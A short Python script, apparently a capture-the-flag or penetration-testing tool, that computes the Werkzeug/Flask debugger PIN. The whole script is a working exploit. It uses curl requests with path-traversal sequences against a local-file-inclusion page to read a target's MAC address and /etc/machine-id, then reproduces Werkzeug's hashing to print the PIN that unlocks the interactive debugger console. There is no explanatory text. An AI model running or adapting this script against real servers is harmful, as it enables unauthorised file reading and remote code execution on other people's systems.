#!/usr/bin/env python3

import subprocess
import hashlib
from itertools import chain

maccmd = "/usr/bin/curl -sX GET --url 'http://<IP>:<port>/<lfi_page_dir>?filename=../../../../../sys/class/net/<interface>/address' -u '<user>:<passwd>' | tr -d ':' | tr -d '\n'"
idcmd = "/usr/bin/curl -sX GET --url 'http://<IP>:<port>/<lfi_page_dir>?filename=../../../../../etc/machine-id' -u '<user>:<passwd>' | tr -d '\n'"
get_node = str(int(subprocess.check_output(maccmd.strip(),shell=True,text=True), base=16))
get_machine_id = subprocess.check_output(idcmd.strip(),shell=True,text=True)

# probably_public_bits = [username, modname,
#                         getattr(app, '__name__', getattr(app.__class__, '__name__')),
#                         getattr(mod, '__file__', None)
#                         ]
probably_public_bits = ['aas', 'flask.app', 'Flask',
                        '/usr/local/lib/python2.7/dist-packages/flask/app.pyc']

# uuid.getnode() -> /sys/class/net/ens33/address
# get_machine_id() -> /etc/machine-id
# private_bits = [str(uuid.getnode()), get_machine_id()]
private_bits = [
    get_node,
    get_machine_id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
